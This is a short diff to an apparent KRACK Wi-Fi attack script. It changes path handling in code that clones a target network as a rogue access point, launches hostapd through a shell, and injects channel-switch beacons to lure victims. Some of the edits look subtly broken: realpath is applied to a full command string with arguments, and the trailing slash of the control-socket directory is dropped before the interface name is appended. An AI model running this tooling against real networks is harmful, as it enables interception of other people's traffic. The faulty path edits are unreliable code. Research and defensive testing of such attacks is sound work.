@@ -615,9 +615,9 @@ class KRAckAttack():
 			subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 
 		# Set up a rogue AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
-		with open(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf"), "w") as fp:
+		with open(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")), "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		hostapd_path = (os.path.join(self.script_path, "../hostapd/hostapd") + ' ' + os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf") + " -dd" + " -K")
+		hostapd_path = os.path.realpath((os.path.join(self.script_path, "../hostapd/hostapd")) + ' ' + os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_rogue.conf")) + " -dd" + " -K")
 		print('debug: ', end='')
 		print(hostapd_path)
 		self.hostapd = subprocess.Popen(hostapd_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -629,7 +629,7 @@ class KRAckAttack():
 		# when domain name (encode) to idna, label empty or too long error, 
 		# that is because domain name uses "." to split label,
 		# every label limited to longest 63 characters or no empty.
-		self.hostapd_ctrl = Ctrl(os.path.join(self.script_path, "../hostapd/hostapd_ctrl/") + self.nic_rogue_ap) # "hostapd_ctrl/"
+		self.hostapd_ctrl = Ctrl(os.path.realpath(os.path.join(self.script_path, "../hostapd/hostapd_ctrl/")) + self.nic_rogue_ap) # "hostapd_ctrl/"
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
